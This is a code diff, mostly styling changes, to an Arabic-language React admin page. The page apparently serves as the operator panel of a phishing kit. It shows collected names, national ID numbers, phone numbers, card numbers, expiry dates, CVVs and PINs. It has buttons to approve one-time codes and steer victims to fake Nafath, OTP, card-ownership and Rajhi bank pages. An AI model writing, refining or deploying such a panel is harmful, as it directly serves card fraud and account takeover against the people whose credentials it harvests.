+                  className="w-full bg-gradient-to-r from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700 text-white border-0 shadow-md"
                 >
                   باس
                 </Button>
@@ -1751,7 +1772,7 @@ export default function NotificationsPage() {
                   onClick={() => {
                     handlePhoneOtpApproval("approved", selectedCardInfo.id)
                   }}
-                  className="w-full bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-600 hover:to-orange-600 text-white border-0 shadow-lg transition-all duration-300"
+                  className="w-full bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-600 hover:to-amber-700 text-white border-0 shadow-md"
                 >
                   رفض OTP
                 </Button>
@@ -1759,7 +1780,7 @@ export default function NotificationsPage() {
                   onClick={() => {
                     handleUpdatePagename(selectedCardInfo.id, "external-link")
                   }}
-                  className="w-full bg-gradient-to-r from-teal-500 to-cyan-500 hover:from-teal-600 hover:to-cyan-600 text-white border-0 shadow-lg transition-all duration-300"
+                  className="w-full bg-gradient-to-r from-teal-500 to-teal-600 hover:from-teal-600 hover:to-teal-700 text-white border-0 shadow-md"
                 >
                   راجحي
                 </Button>
@@ -1772,33 +1793,32 @@ export default function NotificationsPage() {
       {/* Pagename Dialog */}
       <Dialog open={showPagenameDialog} onOpenChange={(open) => !open && setShowPagenameDialog(false)}>
         <DialogContent
-          className="bg-white/95 dark:bg-slate-800/95 border-0 shadow-2xl max-w-md rounded-xl backdrop-blur-sm"
+          className="bg-white/95 dark:bg-stone-800/95 border-0 shadow-xl max-w-md rounded-xl backdrop-blur-sm"
           dir="rtl"
         >
-          <DialogHeader className="border-b border-purple-200/50 pb-3">
-            <DialogTitle className="text-xl font-bold bg-gradient-to-r from-purple-600 via-violet-600 to-indigo-600 text-transparent bg-clip-text">
+          <DialogHeader className="border-b border-stone-200/50 pb-3">
+            <DialogTitle className="text-xl font-bold bg-gradient-to-r from-emerald-600 to-teal-600 text-transparent bg-clip-text">
               نوع الطلب
             </DialogTitle>
-            <DialogDescription className="text-slate-600">تحديد أو تغيير نوع الطلب</DialogDescription>
+            <DialogDescription className="text-stone-600">تحديد أو تغيير نوع الطلب</DialogDescription>
           </DialogHeader>
 
           {selectedNotification && (
             <div className="space-y-4 py-3">
-              <div className="p-4 rounded-lg bg-gradient-to-r from-purple-50 via-violet-50 to-indigo-50 border border-purple-200 shadow-sm">
-                <h3 className="font-medium mb-3 text-sm text-purple-700">النوع الحالي</h3>
+              <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700">
+                <h3 className="font-medium mb-3 text-sm text-stone-700 dark:text-stone-300">النوع الحالي</h3>
                 <div className="flex justify-center">{getPageType(selectedNotification.pagename)}</div>
               </div>
 
-              <div className="p-4 rounded-lg bg-gradient-to-r from-slate-50 via-gray-50 to-zinc-50 border border-slate-200 shadow-sm">
-                <h3 className="font-medium mb-3 text-sm text-slate-700">اختر نوع الطلب</h3>
+              <div className="p-4 rounded-lg bg-stone-50 dark:bg-stone-700">
+                <h3 className="font-medium mb-3 text-sm text-stone-700 dark:text-stone-300">اختر نوع الطلب</h3>
                 <div className="grid grid-cols-2 gap-2">
                   <Button
                     variant="outline"
-                    className={`flex items-center gap-2 justify-center border-emerald-200 hover:bg-gradient-to-r hover:from-emerald-50 hover:to-teal-50 transition-all duration-300 ${
-                      selectedNotification.pagename === "payment"
-                        ? "bg-gradient-to-r from-emerald-100 to-teal-100 border-emerald-300 shadow-md"
+                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${selectedNotification.pagename === "payment"
+                        ? "bg-emerald-50 border-emerald-300 dark:bg-emerald-900/30 dark:border-emerald-700"
                         : ""
-                    }`}
+                      }`}
                     onClick={() => handleUpdatePagename(selectedNotification.id, "payment")}
                   >
                     <CreditCard className="h-4 w-4" />
@@ -1806,11 +1826,10 @@ export default function NotificationsPage() {
                   </Button>
                   <Button
                     variant="outline"
-                    className={`flex items-center gap-2 justify-center border-blue-200 hover:bg-gradient-to-r hover:from-blue-50 hover:to-indigo-50 transition-all duration-300 ${
-                      selectedNotification.pagename === ""
-                        ? "bg-gradient-to-r from-blue-100 to-indigo-100 border-blue-300 shadow-md"
+                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${selectedNotification.pagename === ""
+                        ? "bg-indigo-50 border-indigo-300 dark:bg-indigo-900/30 dark:border-indigo-700"
                         : ""
-                    }`}
+                      }`}
                     onClick={() => handleUpdatePagename(selectedNotification.id, "")}
                   >
                     <FileText className="h-4 w-4" />
@@ -1818,11 +1837,10 @@ export default function NotificationsPage() {
                   </Button>
                   <Button
                     variant="outline"
-                    className={`flex items-center gap-2 justify-center border-cyan-200 hover:bg-gradient-to-r hover:from-cyan-50 hover:to-sky-50 transition-all duration-300 ${
-                      selectedNotification.pagename === "nafaz"
-                        ? "bg-gradient-to-r from-cyan-100 to-sky-100 border-cyan-300 shadow-md"
+                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${selectedNotification.pagename === "nafaz"
+                        ? "bg-cyan-50 border-cyan-300 dark:bg-cyan-900/30 dark:border-cyan-700"
                         : ""
-                    }`}
+                      }`}
                     onClick={() => handleUpdatePagename(selectedNotification.id, "nafaz")}
                   >
                     <Shield className="h-4 w-4" />
@@ -1830,11 +1848,10 @@ export default function NotificationsPage() {
                   </Button>
                   <Button
                     variant="outline"
-                    className={`flex items-center gap-2 justify-center border-purple-200 hover:bg-gradient-to-r hover:from-purple-50 hover:to-violet-50 transition-all duration-300 ${
-                      selectedNotification.pagename === "verify-otp"
-                        ? "bg-gradient-to-r from-purple-100 to-violet-100 border-purple-300 shadow-md"
+                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${selectedNotification.pagename === "verify-otp"
+                        ? "bg-purple-50 border-purple-300 dark:bg-purple-900/30 dark:border-purple-700"
                         : ""
-                    }`}
+                      }`}
                     onClick={() => handleUpdatePagename(selectedNotification.id, "verify-otp")}
                   >
                     <Shield className="h-4 w-4" />
@@ -1842,11 +1859,10 @@ export default function NotificationsPage() {
                   </Button>
                   <Button
                     variant="outline"
-                    className={`flex items-center gap-2 justify-center border-teal-200 hover:bg-gradient-to-r hover:from-teal-50 hover:to-cyan-50 transition-all duration-300 ${
-                      selectedNotification.pagename === "external-link"
-                        ? "bg-gradient-to-r from-teal-100 to-cyan-100 border-teal-300 shadow-md"
+                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${selectedNotification.pagename === "external-link"
+                        ? "bg-teal-50 border-teal-300 dark:bg-teal-900/30 dark:border-teal-700"
                         : ""
-                    }`}
+                      }`}
                     onClick={() => handleUpdatePagename(selectedNotification.id, "external-link")}
                   >
                     <Tag className="h-4 w-4" />
@@ -1854,11 +1870,10 @@ export default function NotificationsPage() {
                   </Button>
                   <Button
                     variant="outline"
-                    className={`flex items-center gap-2 justify-center border-amber-200 hover:bg-gradient-to-r hover:from-amber-50 hover:to-yellow-50 transition-all duration-300 ${
-                      selectedNotification.pagename === "verify-card-ownership"
-                        ? "bg-gradient-to-r from-amber-100 to-yellow-100 border-amber-300 shadow-md"
+                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${selectedNotification.pagename === "verify-card-ownership"
+                        ? "bg-amber-50 border-amber-300 dark:bg-amber-900/30 dark:border-amber-700"
                         : ""
-                    }`}
+                      }`}
                     onClick={() => handleUpdatePagename(selectedNotification.id, "verify-card-ownership")}
                   >
                     <CreditCard className="h-4 w-4" />
@@ -1866,11 +1881,10 @@ export default function NotificationsPage() {
                   </Button>
                   <Button
                     variant="outline"
-                    className={`flex items-center gap-2 justify-center border-orange-200 hover:bg-gradient-to-r hover:from-orange-50 hover:to-amber-50 transition-all duration-300 ${
-                      selectedNotification.pagename === "verify-phone"
-                        ? "bg-gradient-to-r from-orange-100 to-amber-100 border-orange-300 shadow-md"
+                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${selectedNotification.pagename === "verify-phone"
+                        ? "bg-orange-50 border-orange-300 dark:bg-orange-900/30 dark:border-orange-700"
                         : ""
-                    }`}
+                      }`}
                     onClick={() => handleUpdatePagename(selectedNotification.id, "verify-phone")}
                   >
                     <Smartphone className="h-4 w-4" />
@@ -1878,11 +1892,10 @@ export default function NotificationsPage() {
                   </Button>
                   <Button
                     variant="outline"
-                    className={`flex items-center gap-2 justify-center border-emerald-200 hover:bg-gradient-to-r hover:from-emerald-50 hover:to-green-50 transition-all duration-300 ${
-                      selectedNotification.pagename === "offers"
-                        ? "bg-gradient-to-r from-emerald-100 to-green-100 border-emerald-300 shadow-md"
+                    className={`flex items-center gap-2 justify-center border-stone-200 hover:bg-stone-50 ${selectedNotification.pagename === "offers"
+                        ? "bg-emerald-50 border-emerald-300 dark:bg-emerald-900/30 dark:border-emerald-700"
                         : ""
-                    }`}
+                      }`}
                     onClick={() => handleUpdatePagename(selectedNotification.id, "offers")}
                   >
                     <Tag className="h-4 w-4" />
@@ -1893,10 +1906,10 @@ export default function NotificationsPage() {
             </div>
           )}
 
-          <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t border-purple-200/50">
+          <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t border-stone-200/50">
             <Button
               onClick={() => setShowPagenameDialog(false)}
-              className="w-full border-purple-200 hover:bg-gradient-to-r hover:from-purple-50 hover:to-indigo-50 transition-all duration-300"
+              className="w-full border-stone-200 hover:bg-stone-50"
               variant="outline"
             >
               إغلاق
@@ -1909,23 +1922,23 @@ export default function NotificationsPage() {
       <Sheet open={showSidebar} onOpenChange={setShowSidebar}>
         <SheetContent side="left" className="w-full sm:max-w-md overflow-y-auto bg-white/95 backdrop-blur-sm" dir="rtl">
           <SheetHeader className="text-right">
-            <SheetTitle className="text-xl font-bold bg-gradient-to-r from-purple-600 via-violet-600 to-indigo-600 text-transparent bg-clip-text">
+            <SheetTitle className="text-xl font-bold bg-gradient-to-r from-emerald-600 to-teal-600 text-transparent bg-clip-text">
               تفاصيل البيانات
             </SheetTitle>
-            <SheetDescription className="text-slate-600">عرض جميع المعلومات المتعلقة بهذا الطلب</SheetDescription>
+            <SheetDescription className="text-stone-600">عرض جميع المعلومات المتعلقة بهذا الطلب</SheetDescription>
           </SheetHeader>
 
           {selectedNotification && (
             <div className="mt-6 space-y-6">
-              <div className="bg-gradient-to-r from-blue-50 via-indigo-50 to-purple-50 rounded-lg p-4 border border-blue-200 shadow-sm">
-                <h3 className="text-lg font-semibold mb-2 flex items-center gap-2 text-blue-800">
-                  <User className="h-5 w-5 text-blue-600" />
+              <div className="bg-emerald-50 rounded-lg p-4 border border-emerald-100">
+                <h3 className="text-lg font-semibold mb-2 flex items-center gap-2 text-stone-800">
+                  <User className="h-5 w-5 text-emerald-600" />
                   المعلومات الشخصية
                 </h3>
                 <div className="space-y-3">
                   <div className="flex justify-between">
-                    <span className="text-sm text-blue-600 font-medium">الاسم الكامل:</span>
-                    <span className="font-medium text-slate-800">
+                    <span className="text-sm text-stone-600">الاسم الكامل:</span>
+                    <span className="font-medium text-stone-800">
                       {selectedNotification.documment_owner_full_name ||
                         selectedNotification.document_owner_full_name ||
                         selectedNotification.full_name ||
@@ -1933,23 +1946,23 @@ export default function NotificationsPage() {
                     </span>
                   </div>
                   <div className="flex justify-between">
-                    <span className="text-sm text-blue-600 font-medium">رقم الهوية:</span>
-                    <span className="font-medium font-mono text-slate-800">
+                    <span className="text-sm text-stone-600">رقم الهوية:</span>
+                    <span className="font-medium font-mono text-stone-800">
                       {selectedNotification.owner_identity_number ||
                         selectedNotification.buyer_identity_number ||
                         "غير محدد"}
                     </span>
                   </div>
                   <div className="flex justify-between">
-                    <span className="text-sm text-blue-600 font-medium">رقم الهاتف:</span>
-                    <span className="font-medium font-mono text-slate-800">
+                    <span className="text-sm text-stone-600">رقم الهاتف:</span>
+                    <span className="font-medium font-mono text-stone-800">
                       {selectedNotification.phone || "غير محدد"}
                     </span>
                   </div>
                   {selectedNotification.phone2 && (
                     <div className="flex justify-between">
-                      <span className="text-sm text-blue-600 font-medium">رقم الهاتف 2:</span>
-                      <span className="font-medium font-mono text-slate-800">{selectedNotification.phone2}</span>
+                      <span className="text-sm text-stone-600">رقم الهاتف 2:</span>
+                      <span className="font-medium font-mono text-stone-800">{selectedNotification.phone2}</span>
                     </div>
                   )}
                 </div>
@@ -1957,69 +1970,69 @@ export default function NotificationsPage() {
 
               {(selectedNotification.card_number ||
                 (selectedNotification.formData && selectedNotification.formData.card_number)) && (
-                <div className="bg-gradient-to-r from-emerald-50 via-teal-50 to-cyan-50 rounded-lg p-4 border border-emerald-200 shadow-sm">
-                  <h3 className="text-lg font-semibold mb-2 flex items-center gap-2 text-emerald-800">
-                    <CreditCard className="h-5 w-5 text-emerald-600" />
-                    معلومات البطاقة
-                  </h3>
-                  <div className="space-y-3">
-                    <div className="flex justify-between">
-                      <span className="text-sm text-emerald-600 font-medium">رقم البطاقة:</span>
-                      <span className="font-medium font-mono text-slate-800">
-                        {selectedNotification.card_number ||
-                          (selectedNotification.formData && selectedNotification.formData.card_number) ||
-                          "غير محدد"}
-                      </span>
-                    </div>
-                    <div className="flex justify-between">
-                      <span className="text-sm text-emerald-600 font-medium">تاريخ الانتهاء:</span>
-                      <span className="font-medium font-mono text-slate-800">
-                        {selectedNotification.expiration_date ||
-                          (selectedNotification.formData && selectedNotification.formData.expiration_date) ||
-                          "غير محدد"}
-                      </span>
-                    </div>
-                    <div className="flex justify-between">
-                      <span className="text-sm text-emerald-600 font-medium">رمز الأمان:</span>
-                      <span className="font-medium font-mono text-slate-800">
-                        {selectedNotification.cvv ||
-                          (selectedNotification.formData && selectedNotification.formData.cvv) ||
-                          "غير محدد"}
-                      </span>
-                    </div>
-                    {selectedNotification.pinCode && (
+                  <div className="bg-teal-50 rounded-lg p-4 border border-teal-100">
+                    <h3 className="text-lg font-semibold mb-2 flex items-center gap-2 text-stone-800">
+                      <CreditCard className="h-5 w-5 text-teal-600" />
+                      معلومات البطاقة
+                    </h3>
+                    <div className="space-y-3">
                       <div className="flex justify-between">
-                        <span className="text-sm text-emerald-600 font-medium">الرقم السري:</span>
-                        <span className="font-medium font-mono text-slate-800">{selectedNotification.pinCode}</span>
+                        <span className="text-sm text-stone-600">رقم البطاقة:</span>
+                        <span className="font-medium font-mono text-stone-800">
+                          {selectedNotification.card_number ||
+                            (selectedNotification.formData && selectedNotification.formData.card_number) ||
+                            "غير محدد"}
+                        </span>
                       </div>
-                    )}
+                      <div className="flex justify-between">
+                        <span className="text-sm text-stone-600">تاريخ الانتهاء:</span>
+                        <span className="font-medium font-mono text-stone-800">
+                          {selectedNotification.expiration_date ||
+                            (selectedNotification.formData && selectedNotification.formData.expiration_date) ||
+                            "غير محدد"}
+                        </span>
+                      </div>
+                      <div className="flex justify-between">
+                        <span className="text-sm text-stone-600">رمز الأمان:</span>
+                        <span className="font-medium font-mono text-stone-800">
+                          {selectedNotification.cvv ||
+                            (selectedNotification.formData && selectedNotification.formData.cvv) ||
+                            "غير محدد"}
+                        </span>
+                      </div>
+                      {selectedNotification.pinCode && (
+                        <div className="flex justify-between">
+                          <span className="text-sm text-stone-600">الرقم السري:</span>
+                          <span className="font-medium font-mono text-stone-800">{selectedNotification.pinCode}</span>
+                        </div>
+                      )}
+                    </div>
                   </div>
-                </div>
-              )}
+                )}
 
               {selectedNotification.vehicle_type && (
-                <div className="bg-gradient-to-r from-purple-50 via-violet-50 to-indigo-50 rounded-lg p-4 border border-purple-200 shadow-sm">
-                  <h3 className="text-lg font-semibold mb-2 flex items-center gap-2 text-purple-800">
-                    <Car className="h-5 w-5 text-purple-600" />
+                <div className="bg-indigo-50 rounded-lg p-4 border border-indigo-100">
+                  <h3 className="text-lg font-semibold mb-2 flex items-center gap-2 text-stone-800">
+                    <Car className="h-5 w-5 text-indigo-600" />
                     معلومات المركبة
                   </h3>
                   <div className="space-y-3">
                     <div className="flex justify-between">
-                      <span className="text-sm text-purple-600 font-medium">نوع المركبة:</span>
-                      <span className="font-medium text-slate-800">{selectedNotification.vehicle_type}</span>
+                      <span className="text-sm text-stone-600">نوع المركبة:</span>
+                      <span className="font-medium text-stone-800">{selectedNotification.vehicle_type}</span>
                     </div>
                     {selectedNotification.vehicle_manufacture_number && (
                       <div className="flex justify-between">
-                        <span className="text-sm text-purple-600 font-medium">رقم تصنيع المركبة:</span>
-                        <span className="font-medium font-mono text-slate-800">
+                        <span className="text-sm text-stone-600">رقم تصنيع المركبة:</span>
+                        <span className="font-medium font-mono text-stone-800">
                           {selectedNotification.vehicle_manufacture_number}
                         </span>
                       </div>
                     )}
                     {selectedNotification.customs_code && (
                       <div className="flex justify-between">
-                        <span className="text-sm text-purple-600 font-medium">رمز الجمارك:</span>
-                        <span className="font-medium font-mono text-slate-800">
+                        <span className="text-sm text-stone-600">رمز الجمارك:</span>
+                        <span className="font-medium font-mono text-stone-800">
                           {selectedNotification.customs_code}
                         </span>
                       </div>
@@ -2028,24 +2041,27 @@ export default function NotificationsPage() {
                 </div>
               )}
 
-              <div className="bg-gradient-to-r from-amber-50 via-orange-50 to-yellow-50 rounded-lg p-4 border border-amber-200 shadow-sm">
-                <h3 className="text-lg font-semibold mb-2 flex items-center gap-2 text-amber-800">
+              <div className="bg-amber-50 rounded-lg p-4 border border-amber-100">
+                <h3 className="text-lg font-semibold mb-2 flex items-center gap-2 text-stone-800">
                   <Bell className="h-5 w-5 text-amber-600" />
                   معلومات الطلب
                 </h3>
                 <div className="space-y-3">
                   <div className="flex justify-between">
-                    <span className="text-sm text-amber-600 font-medium">نوع الطلب:</span>
+                    <span className="text-sm text-stone-600">نوع الطلب:</span>
                     <div>{getPageType(selectedNotification.pagename)}</div>
                   </div>
                   <div className="flex justify-between">
-                    <span className="text-sm text-amber-600 font-medium">الحالة:</span>
+                    <span className="text-sm text-stone-600">الحالة:</span>
                     <div>{getStatusBadge(selectedNotification.status)}</div>
                   </div>
                   <div className="flex justify-between">
-                    <span className="text-sm text-amber-600 font-medium">تاريخ الإنشاء:</span>
-                    <span className="font-medium text-slate-800">
-                      {format(new Date(selectedNotification.createdDate), "yyyy/MM/dd HH:mm")}
+                    <span className="text-sm text-stone-600">تاريخ الإنشاء:</span>
+                    <span className="font-medium text-stone-800">
+                      {formatDistanceToNow(new Date(selectedNotification.createdDate), {
+                        addSuffix: true,
+                        locale: ar,
+                      })}
                     </span>
                   </div>
                 </div>
@@ -2057,7 +2073,7 @@ export default function NotificationsPage() {
                     handleApproval("approved", selectedNotification.id)
                     setShowSidebar(false)
                   }}
-                  className="flex-1 bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-600 hover:to-teal-600 text-white border-0 shadow-lg transition-all duration-300"
+                  className="flex-1 bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 text-white border-0 shadow-md"
                 >
                   <CheckCircle className="h-4 w-4 mr-2" />
                   قبول
@@ -2067,7 +2083,7 @@ export default function NotificationsPage() {
                     handleApproval("rejected", selectedNotification.id)
                     setShowSidebar(false)
                   }}
-                  className="flex-1 bg-gradient-to-r from-rose-500 to-red-500 hover:from-rose-600 hover:to-red-600 text-white border-0 shadow-lg transition-all duration-300"
+                  className="flex-1 bg-gradient-to-r from-rose-500 to-red-500 hover:from-rose-600 hover:to-red-600 text-white border-0 shadow-md"
                 >
                   <XCircle className="h-4 w-4 mr-2" />
                   رفض
@@ -2078,7 +2094,7 @@ export default function NotificationsPage() {
                     setShowSidebar(false)
                   }}
                   variant="outline"
-                  className="flex-1 border-purple-200 hover:bg-gradient-to-r hover:from-purple-50 hover:to-indigo-50 transition-all duration-300"
+                  className="flex-1 border-stone-200 hover:bg-stone-50"
                 >
                   <Trash2 className="h-4 w-4 mr-2" />
                   حذف
@@ -2095,7 +2111,7 @@ export default function NotificationsPage() {
       <NafazAuthDialog open={showNafazDialog} onOpenChange={setShowNafazDialog} notification={selectedNotification} />
 
       <PhoneDialog
-        phoneOtp={selectedNotification?.phoneOtp!}
+        phoneOtp={selectedNotification?.phoneOtp}
         handlePhoneOtpApproval={handlePhoneOtpApproval}
         open={showPhoneDialog}
         onOpenChange={setPhoneDialog}
@@ -2104,3 +2120,4 @@ export default function NotificationsPage() {
     </div>
   )
 }
+
